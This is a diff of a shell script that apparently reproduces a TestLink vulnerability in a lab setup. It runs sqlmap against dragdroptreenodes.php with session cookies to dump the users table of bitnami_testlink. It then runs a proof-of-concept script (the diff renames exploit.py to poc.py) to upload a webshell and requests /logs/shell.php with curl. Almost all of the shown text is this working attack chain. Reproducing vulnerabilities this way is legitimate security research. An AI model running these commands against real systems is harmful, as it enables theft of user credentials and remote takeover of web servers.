@@ -27,7 +27,7 @@ python3 sqlmap.py --version
 python3 sqlmap.py -u http://web/lib/ajax/dragdroptreenodes.php --data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47" -p nodeid --cookie="PHPSESSID=${indexed_arr[0]};TESTLINK1920TESTLINK_USER_AUTH_COOKIE=${indexed_arr[1]}" --dump -D bitnami_testlink -T users   --answers="follow=n"  -v  0 >> 1.txt
 
 #upload webshell
-python3 /opt/poc/exploit.py http://web
+python3 /opt/poc/poc.py http://web
 cat temp
 curl http://web/logs/shell.php
 echo "poc ok"
